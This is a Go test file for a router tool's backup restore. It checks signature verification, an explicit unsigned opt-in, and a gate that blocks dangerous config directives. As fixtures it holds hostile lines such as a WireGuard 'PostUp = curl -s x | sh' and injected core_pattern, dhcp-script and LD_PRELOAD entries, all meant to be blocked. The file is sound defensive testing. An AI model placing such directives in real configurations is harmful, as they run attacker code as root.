package main

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"errors"
	"io"
	"path/filepath"
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/tui-tools/tui-kit/theme"
	"github.com/tui-tools/tui-router/internal/backup"
	"github.com/tui-tools/tui-router/internal/router"
)

// trustRuleset is a ruleset the demo router does not already have, so a
// restore of it has something to apply.
const trustRuleset = "table inet filter {\n\tchain input {\n\t\ttcp dport 4242 accept\n\t}\n}\n"

// signingPair writes an Ed25519 key pair the way an operator keeps one (base64
// files) and returns the signer and the public key file's path.
func signingPair(t *testing.T) (backup.Signer, string) {
	t.Helper()
	dir := t.TempDir()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	pubPath := filepath.Join(dir, "sign.pub")
	writeFile(t, pubPath, base64.StdEncoding.EncodeToString(pub))
	signer, err := backup.NewEd25519Signer(priv.Seed(), "")
	if err != nil {
		t.Fatal(err)
	}
	return signer, pubPath
}

// artifactFile assembles src into an artifact file, signed when signer is set.
func artifactFile(t *testing.T, src backup.Sources, signer backup.Signer) string {
	t.Helper()
	data, err := backup.Assemble(src, backup.Meta{ToolVersion: "test", Hostname: "lab-router", Timestamp: "x"}, signer)
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "a.tuiback")
	writeRawFile(t, path, data)
	return path
}

// TestRestoreRefusesUnverifiedByDefault is the new default: an unsigned
// artifact, and a signed one nobody checked, are refused before anything is
// read from the machine — with a message that says what to pass.
func TestRestoreRefusesUnverifiedByDefault(t *testing.T) {
	signer, _ := signingPair(t)
	for name, path := range map[string]string{
		"unsigned":            artifactFile(t, backup.Sources{Nftables: trustRuleset}, nil),
		"signed, not checked": artifactFile(t, backup.Sources{Nftables: trustRuleset}, signer),
	} {
		var out bytes.Buffer
		err := runRestore([]string{"--demo", path}, strings.NewReader("yes\nkeep\n"), &out)
		if err == nil {
			t.Fatalf("%s: restore applied an unverified artifact:\n%s", name, out.String())
		}
		for _, want := range []string{"restore refused", "--verify PUBKEY", "--allow-unsigned"} {
			if !strings.Contains(err.Error(), want) {
				t.Errorf("%s: the refusal does not mention %q: %v", name, want, err)
			}
		}
		if strings.Contains(out.String(), "applied") {
			t.Errorf("%s: something was applied:\n%s", name, out.String())
		}
	}
}

// TestRestoreAllowUnsignedIsExplicit asserts the opt-in: with --allow-unsigned
// an unsigned artifact applies, and the run says in so many words what is
// being trusted before the confirmation.
func TestRestoreAllowUnsignedIsExplicit(t *testing.T) {
	path := artifactFile(t, backup.Sources{Nftables: trustRuleset}, nil)
	var out bytes.Buffer
	if err := runRestore([]string{"--demo", "--allow-unsigned", path},
		strings.NewReader("yes\nkeep\n"), &out); err != nil {
		t.Fatalf("restore --allow-unsigned: %v\n%s", err, out.String())
	}
	text := out.String()
	for _, want := range []string{"NOT VERIFIED", "TRUSTING AN UNVERIFIED ARTIFACT", "ruleset kept"} {
		if !strings.Contains(text, want) {
			t.Errorf("the output lacks %q:\n%s", want, text)
		}
	}
	if strings.Index(text, "TRUSTING") > strings.Index(text, "Type 'yes'") {
		t.Errorf("the trust warning must come before the confirmation:\n%s", text)
	}
}

// TestRestoreVerifiedNeedsNoOptIn asserts a signature verified against the
// operator's key is enough on its own, and that the two trust flags cannot be
// combined.
func TestRestoreVerifiedNeedsNoOptIn(t *testing.T) {
	signer, pubPath := signingPair(t)
	path := artifactFile(t, backup.Sources{Nftables: trustRuleset}, signer)
	var out bytes.Buffer
	if err := runRestore([]string{"--demo", "--verify", pubPath, path},
		strings.NewReader("yes\nkeep\n"), &out); err != nil {
		t.Fatalf("restore --verify: %v\n%s", err, out.String())
	}
	if !strings.Contains(out.String(), "verified against the given public key") ||
		strings.Contains(out.String(), "TRUSTING") {
		t.Errorf("a verified restore should say so and ask no trust:\n%s", out.String())
	}

	out.Reset()
	err := runRestore([]string{"--demo", "--verify", pubPath, "--allow-unsigned", path},
		strings.NewReader(""), &out)
	if err == nil || !strings.Contains(err.Error(), "contradict") {
		t.Fatalf("--verify with --allow-unsigned should be refused, got %v", err)
	}
}

// TestRestoreDryRunPreviewsUnverified asserts --dry-run still previews an
// unsigned artifact (it applies nothing), and says a restore would need one
// of the two flags.
func TestRestoreDryRunPreviewsUnverified(t *testing.T) {
	path := artifactFile(t, backup.Sources{Nftables: trustRuleset}, nil)
	var out bytes.Buffer
	if err := runRestore([]string{"--demo", "--dry-run", path}, strings.NewReader(""), &out); err != nil {
		t.Fatalf("dry-run: %v\n%s", err, out.String())
	}
	for _, want := range []string{"NOT VERIFIED", "--allow-unsigned", "nothing was applied"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("the dry-run lacks %q:\n%s", want, out.String())
		}
	}
}

// TestRestoreRefusesDangerousDirectives asserts the content gate at the
// command: a directive that would run as root blocks the restore — even when
// the signature verifies, because a signature says who wrote the bytes, not
// that they are safe — and the preview names the file and the line.
func TestRestoreRefusesDangerousDirectives(t *testing.T) {
	signer, pubPath := signingPair(t)
	hostile := backup.Sources{
		Nftables: trustRuleset,
		Sysctl:   "net.ipv4.ip_forward=1\nkernel.core_pattern=|/var/tmp/x\n",
		Wireguard: map[string]backup.WGConf{
			"wg0": {Config: "[Interface]\nAddress = 10.0.0.1/24\nPostUp = curl -s x | sh\n"},
		},
	}
	path := artifactFile(t, hostile, signer)
	for _, args := range [][]string{
		{"--demo", "--verify", pubPath, path},
		{"--demo", "--verify", pubPath, "--dry-run", path},
	} {
		var out bytes.Buffer
		err := runRestore(args, strings.NewReader("yes\nkeep\n"), &out)
		var refused *router.RestoreRefusedError
		if !errors.As(err, &refused) {
			t.Fatalf("%v: the restore was not refused: %v\n%s", args, err, out.String())
		}
		for _, want := range []string{
			"BLOCKED",
			"/etc/sysctl.d/30-omarchy-router.conf:2",
			"kernel.core_pattern=|/var/tmp/x",
			"/etc/wireguard/wg0.conf:3",
			"PostUp = curl -s x | sh",
		} {
			if !strings.Contains(out.String(), want) {
				t.Errorf("%v: the preview lacks %q:\n%s", args, want, out.String())
			}
		}
		if strings.Contains(out.String(), "Type 'yes'") {
			t.Errorf("%v: a blocked restore must not ask for the confirmation:\n%s", args, out.String())
		}
	}
}

// TestApplyRestoreWritesNothingWhenBlocked asserts the apply engine refuses
// before the first write: a blocked artifact leaves the machine untouched
// rather than half-restored.
func TestApplyRestoreWritesNothingWhenBlocked(t *testing.T) {
	ctx := context.Background()
	dst := router.NewEmptyFake()
	target := backup.Sources{
		Roles:    "WAN_IFS=\"eth0\"\nLAN_IFS=\"eth1\"\n",
		Nftables: trustRuleset,
		DHCPDNS:  "interface=lan0\ndhcp-script=/var/tmp/x\n",
	}
	err := applyRestore(ctx, dst, target, time.Second, func() bool { return true }, io.Discard)
	var refused *router.RestoreRefusedError
	if !errors.As(err, &refused) {
		t.Fatalf("applyRestore did not refuse: %v", err)
	}
	after, err := dst.CollectSources(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if after.Roles != "" || after.Nftables != "" || after.DHCPDNS != "" {
		t.Fatalf("a blocked restore wrote something: %+v", after)
	}
}

// openInScreen drives the cockpit's restore to its plan: the artifact path,
// then — for a signed artifact no key of the machine verifies — the public key
// prompt (empty for none). An unsigned artifact has nothing to verify and goes
// straight to the plan.
func openInScreen(t *testing.T, path, pubPath string) *backupScreen {
	t.Helper()
	s := newBackupScreen(router.NewFake())
	stepScreen(t, s, keyRunes("r"))
	stepScreen(t, s, keyRunes(path))
	stepScreen(t, s, tea.KeyMsg{Type: tea.KeyEnter})
	if s.step == bsVerifyKey {
		s.input.Model.SetValue(pubPath)
		stepScreen(t, s, tea.KeyMsg{Type: tea.KeyEnter})
	} else if pubPath != "" {
		t.Fatalf("the restore should ask for a public key, step = %v (%s)", s.step, s.failed)
	}
	if s.step != bsRestorePlan {
		t.Fatalf("the restore plan should be shown, step = %v (%s)", s.step, s.failed)
	}
	return s
}

// TestBackupScreenUnverifiedNeedsTheTrustPhrase asserts the cockpit's opt-in:
// an unverified artifact shows its signature state in the danger colour, then
// asks for the typed trust phrase before the ordinary confirmation, and a
// wrong phrase applies nothing.
func TestBackupScreenUnverifiedNeedsTheTrustPhrase(t *testing.T) {
	path := artifactFile(t, backup.Sources{Nftables: trustRuleset}, nil)

	s := openInScreen(t, path, "")
	if view := s.View(theme.New(), 120, 60); !strings.Contains(view, "NOT VERIFIED") {
		t.Errorf("the plan does not say the signature is not verified:\n%s", view)
	}
	stepScreen(t, s, keyRunes("y"))
	if s.step != bsTrustConfirm {
		t.Fatalf("an unverified artifact must ask for the trust phrase, step = %v", s.step)
	}
	if view := s.View(theme.New(), 120, 60); !strings.Contains(view, "Nothing proves who wrote") {
		t.Errorf("the trust prompt does not say what is trusted:\n%s", view)
	}
	stepScreen(t, s, keyRunes("yes"))
	stepScreen(t, s, tea.KeyMsg{Type: tea.KeyEnter})
	if s.step != bsDone || !strings.Contains(s.failed, "trust confirmation did not match") {
		t.Fatalf("the wrong phrase should stop the restore: step=%v failed=%q", s.step, s.failed)
	}

	s = openInScreen(t, path, "")
	stepScreen(t, s, keyRunes("y"))
	stepScreen(t, s, keyRunes(trustPhrase))
	stepScreen(t, s, tea.KeyMsg{Type: tea.KeyEnter})
	if s.step != bsConfirm {
		t.Fatalf("the trust phrase should lead to the ordinary confirmation, step = %v (%s)", s.step, s.failed)
	}
}

// TestBackupScreenVerifiedSkipsTheTrustPhrase asserts a signature verified
// with the key typed into the prompt goes straight to the confirmation.
func TestBackupScreenVerifiedSkipsTheTrustPhrase(t *testing.T) {
	signer, pubPath := signingPair(t)
	path := artifactFile(t, backup.Sources{Nftables: trustRuleset}, signer)
	s := openInScreen(t, path, pubPath)
	if !s.artifact.SignatureVerified {
		t.Fatal("the signature was not verified with the typed key")
	}
	stepScreen(t, s, keyRunes("y"))
	if s.step != bsConfirm {
		t.Fatalf("a verified artifact should go straight to the confirmation, step = %v", s.step)
	}
}

// TestBackupScreenBlocksDangerousDirectives asserts the cockpit shows the
// gate's findings with file and line and will not move past the plan.
func TestBackupScreenBlocksDangerousDirectives(t *testing.T) {
	path := artifactFile(t, backup.Sources{
		Nftables: trustRuleset,
		Roles:    "WAN_IFS=\"eth0\"\nLAN_IFS=\"eth1\"\nLD_PRELOAD=\"/var/tmp/x.so\"\n",
	}, nil)
	s := openInScreen(t, path, "")
	view := s.View(theme.New(), 140, 80)
	for _, want := range []string{"BLOCKED", "/etc/omarchy/router/roles.conf:3", `LD_PRELOAD="/var/tmp/x.so"`} {
		if !strings.Contains(view, want) {
			t.Errorf("the plan lacks %q:\n%s", want, view)
		}
	}
	stepScreen(t, s, keyRunes("y"))
	if s.step != bsDone || !strings.Contains(s.failed, "restore refused") {
		t.Fatalf("a blocked plan must not continue: step=%v failed=%q", s.step, s.failed)
	}
}
